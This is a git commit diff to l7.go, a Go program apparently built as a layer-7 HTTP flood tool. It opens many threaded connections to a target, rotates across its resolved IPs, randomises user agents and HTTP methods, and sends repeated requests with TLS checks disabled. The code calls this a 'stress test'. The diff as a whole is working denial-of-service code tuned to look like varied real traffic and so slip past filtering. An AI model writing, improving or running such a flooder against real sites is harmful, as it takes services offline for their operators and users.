7e9f0b298c8e123ad7cb4e8e764eebbc3a25cb18
JDPST224 <146357456+JDPST224@users.noreply.github.com>
2024-12-15 12:33:02 +0800

    Update l7.go

--- l7.go
+++ l7.go
@@ -13,48 +13,50 @@ import (
 )
 
 var (
-	ip         string
-	port       int
-	path       string
-	threads    int
-	timer      int
-	cookie     string
-	customHost string // New variable for custom Host header
-	basePath   string
-
-	// More diverse platform choices
+	ip            string
+	ips           []string // List of resolved IPs for DNS Randomization
+	port          int
+	path          string
+	threads       int
+	timer         int
+	cookie        string
+	customHost    string
+	httpMethods   = []string{"GET", "POST", "HEAD"} // Random HTTP methods
+	basePath      string
 	platformChoices = []string{"Macintosh", "Windows", "X11", "Linux", "iPhone", "Android"}
 
-	// Expanded OS options
-	macOSVersions   = []string{"68K", "PPC", "Intel Mac OS X 10_15_7", "Intel Mac OS X 11_2_3", "Intel Mac OS X 12_4"}
-	windowsVersions = []string{"Win3.11", "WinNT4.0", "Windows NT 5.1", "Windows NT 6.1", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
-	linuxVersions   = []string{"Linux i686", "Linux x86_64", "Ubuntu; Linux x86_64", "Debian; Linux x86_64"}
-	androidVersions = []string{"Android 9; Pixel 3", "Android 10; Pixel 4 XL", "Android 11; Pixel 5"}
-	iphoneVersions  = []string{"iPhone; CPU iPhone OS 14_4 like Mac OS X", "iPhone; CPU iPhone OS 15_1 like Mac OS X"}
+	macOSVersions   = []string{"68K", "PPC", "Intel Mac OS X 10_15_7", "Intel Mac OS X 11_2_3"}
+	windowsVersions = []string{"WinNT4.0", "Windows NT 10.0; Win64; x64"}
+	linuxVersions   = []string{"Linux x86_64", "Ubuntu; Linux x86_64"}
+	androidVersions = []string{"Android 11; Pixel 5"}
+	iphoneVersions  = []string{"iPhone; CPU iPhone OS 15_1 like Mac OS X"}
 
-	// Expanded browser choices
-	browsers = []string{"chrome", "firefox", "edge", "safari", "opera", "brave"}
-
-	// Added variation for Accept headers
-	acceptHeaders = []string{
-		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-		"text/html,application/json;q=0.9,*/*;q=0.8",
-		"application/xml;q=0.9,text/html;q=0.8",
-		"*/*;q=0.8",
-	}
-
-	// Language headers for more diversity
-	acceptLanguages = []string{
-		"en-US,en;q=0.5",
-		"en-GB,en;q=0.8",
-		"fr-FR,fr;q=0.7,en;q=0.3",
-		"de-DE,de;q=0.9,en;q=0.5",
-		"es-ES,es;q=0.9,en;q=0.5",
-	}
+	browsers = []string{"chrome", "firefox", "edge"}
 )
 
 func init() {
 	rand.Seed(time.Now().UnixNano())
+}
+
+func resolveDNS(hostname string) {
+	addrs, err := net.LookupIP(hostname)
+	if err != nil {
+		fmt.Println("Failed to resolve DNS:", err)
+		os.Exit(1)
+	}
+
+	for _, addr := range addrs {
+		if ipv4 := addr.To4(); ipv4 != nil {
+			ips = append(ips, ipv4.String())
+		}
+	}
+
+	if len(ips) == 0 {
+		fmt.Println("No valid IP addresses resolved!")
+		os.Exit(1)
+	}
+
+	fmt.Printf("Resolved IPs: %v\n", ips)
 }
 
 func getUserAgent() string {
@@ -75,61 +77,51 @@ func getUserAgent() string {
 	}
 
 	browser := browsers[rand.Intn(len(browsers))]
+	version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
+
 	switch browser {
 	case "chrome":
-		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
-		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s.0 (KHTML, like Gecko) Chrome/%s Safari/%s", os, webkit, version, webkit)
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, version)
 	case "firefox":
-		version := fmt.Sprintf("%d.0", rand.Intn(99))
-		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, version, version)
-	case "edge":
-		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edge/%s", os, version, version)
-	case "safari":
-		version := fmt.Sprintf("%d.0", rand.Intn(99))
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Version/%s Safari/537.36", os, version)
-	case "opera":
-		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 OPR/%s", os, version, version)
-	case "brave":
-		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Brave/%s", os, version, version)
+		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.0", os, rand.Intn(99), rand.Intn(99))
+	default:
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36", os)
 	}
-	return ""
 }
 
-func getHeader() string {
-	// Use customHost if provided, otherwise fall back to ip
+func getHeader(method string) string {
 	hostHeader := ip
 	if customHost != "" {
 		hostHeader = customHost
 	}
 
-	header := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
+	header := fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path)
 	header += fmt.Sprintf("Host: %s\r\n", hostHeader)
 	header += fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
-	header += fmt.Sprintf("Accept: %s\r\n", acceptHeaders[rand.Intn(len(acceptHeaders))])
+	header += "Accept: */*\r\n"
 	header += "Accept-Encoding: gzip, deflate\r\n"
-	header += fmt.Sprintf("Accept-Language: %s\r\n", acceptLanguages[rand.Intn(len(acceptLanguages))])
+	header += "Connection: keep-alive\r\n"
+	if method == "POST" {
+		header += "Content-Length: 0\r\n"
+	}
 	if cookie != "" {
 		header += fmt.Sprintf("Cookie: %s\r\n", cookie)
 	}
-	header += "Connection: keep-alive\r\n\r\n"
+	header += "\r\n"
 	return header
 }
 
 func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
 	defer wg.Done()
 
-	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: ip}
-	address := fmt.Sprintf("%s:%d", ip, port)
-
+	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: customHost}
 	for count := range requestCount {
 		for {
+			randomIP := ips[rand.Intn(len(ips))] // Pick a random resolved IP
+			address := fmt.Sprintf("%s:%d", randomIP, port)
+
 			var conn net.Conn
 			var err error
-
 			if port == 443 {
 				conn, err = tls.Dial("tcp", address, tlsConfig)
 			} else {
@@ -142,7 +134,9 @@ func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
 				continue
 			}
 
-			header := getHeader()
+			method := httpMethods[rand.Intn(len(httpMethods))] // Random HTTP method
+			header := getHeader(method)
+
 			for i := 0; i < count; i++ {
 				time.Sleep(time.Millisecond * time.Duration(rand.Intn(80)))
 				_, err := conn.Write([]byte(header))
@@ -185,11 +179,11 @@ func main() {
 
 	threads, _ = strconv.Atoi(os.Args[2])
 	timer, _ = strconv.Atoi(os.Args[3])
-
-	// Optional custom host
 	if len(os.Args) > 4 {
 		customHost = os.Args[4]
 	}
+
+	resolveDNS(ip)
 
 	fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)
 	if customHost != "" {
